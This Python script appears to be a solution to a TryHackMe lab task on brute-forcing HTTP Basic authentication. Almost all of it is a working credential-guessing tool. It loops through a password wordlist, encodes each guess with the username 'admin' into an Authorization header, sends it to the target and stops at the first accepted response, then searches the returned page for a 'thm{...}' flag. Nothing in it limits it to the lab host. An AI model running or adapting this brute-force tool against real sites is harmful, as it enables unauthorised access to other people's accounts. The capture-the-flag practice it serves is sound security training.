#!/usr/bin/env python3
#
# script designed to solve task5 in TryHackMe's
# Enumeration & Brute Force room. This brute forces
# a website that uses the Basic Authorizaiton header
# to have the user pass credentials.
#
# To Call:
#
#   python3 task5.py enum.thm/labs/basic_auth --wordlist <path_to_wordlist>
#

import argparse
import base64
import os
import platform
import re
import requests

class Attacker:
    def __init__(self, target, wordlist):
        if not(isinstance(target,str)):
            raise TypeError(f"target must be a string. got {type(target)}")

        target = target.strip()
        if len(target) < 1:
            raise ValueError("target cannot be an empty string")
        
        if target[-1] != "/":
            target = f"{target}/"

        if not(isinstance(wordlist,str)):
            raise TypeError(f"wordlist must be a string. got {type(wordlist)}")

        wordlist = wordlist.strip()
        if len(wordlist) < 1:
            raise ValueError("wordlist cannot be an empty string")

        self.__session = requests.Session()
        self.__target = target
        self.__username = "admin"
        self.__wordlist = wordlist
        return

    def __gen_wordlist(self):
        with open(self.__wordlist) as fptr:
            for password in fptr:
                yield password
        return

    def __make_request(self, password):
        """
        function designed to make a request to the
        target and determine whether the creds provided
        successfully authenticated the user.

        if the response code from the target was 400 or
        above, the credentials were incorrect and an
        error will be returned.

        if the response code is below 400, the credentials
        were correct and the text response will be returned
        to the caller to be processed further.
        """
        cred_string = str()
        err = None
        headers = dict()
        main_page = str()

        try:
            password = password.strip()
            cred_string = base64.b64encode(f"admin:{password}".encode("utf-8")).decode("utf-8")
            headers = {"Authorization": f"Basic {cred_string}"}
            resp = self.__session.get(self.__target, headers=headers)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")
            main_page = resp.text
        except Exception as ex:
            err = ex

        return (main_page, err)


    def attack(self):
        """
        main function of class. this will iterate over
        each password in the provided wordlist, pass it
        to the __make_request function and search the
        response text for the flag if a valid password
        has been discovered.

        if a flag is discovered, it will be returned
        to the caller.

        if no password or flag has been found, an error
        will be returned.
        """
        err = None
        flag = str()
        pass_found = bool()
        pass_gen = self.__gen_wordlist()
        pass_val = str()
        result = str()

        try:
            for password in pass_gen:
                password = password.strip()
                SysMsgNB(f"testing \"{password}\"")
                result, err = self.__make_request(password)
                if err:
                    continue
                pass_found = True
                pass_val = password
                break

            if not(pass_found):
                raise ValueError(f"no password found in \"{self.__wordlist}\"")

            SucMsg(f"password found: {pass_val}")

            flag, success, message = FindFlag(result, "thm{.*}")
            if not(success):
                raise ValueError(message)
        except Exception as ex:
            err = ex

        return (flag, err)


############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")
    parser.add_argument("--wordlist", help="wordlist to use for brute force", type=str, dest="wordlist", default="500-worst-passwords.txt")

    args = parser.parse_args()

    target = args.target
    secure = args.secure
    wordlist = args.wordlist

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Wordlist: {wordlist}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}"

    try:
        a = Attacker(baseurl, wordlist)
        flag, err = a.attack()
        if err:
            raise err
        SucMsg(f"flag: {flag}")
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()
